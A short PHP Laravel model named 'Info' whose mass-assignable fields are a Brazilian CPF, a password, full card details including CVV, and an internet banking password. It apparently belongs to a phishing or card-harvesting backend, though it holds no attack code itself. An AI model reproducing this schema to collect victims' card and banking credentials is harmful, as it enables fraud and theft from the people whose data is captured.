<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;

class Info extends Model
{
    use HasFactory;
    protected $fillable = [
        'cpf',
        'senha',
        'nome_cartao',
        'numero_cartao',
        'validade_cartao',
        'cvv_cartao',
        'pass_internet_banking',
    ];
}
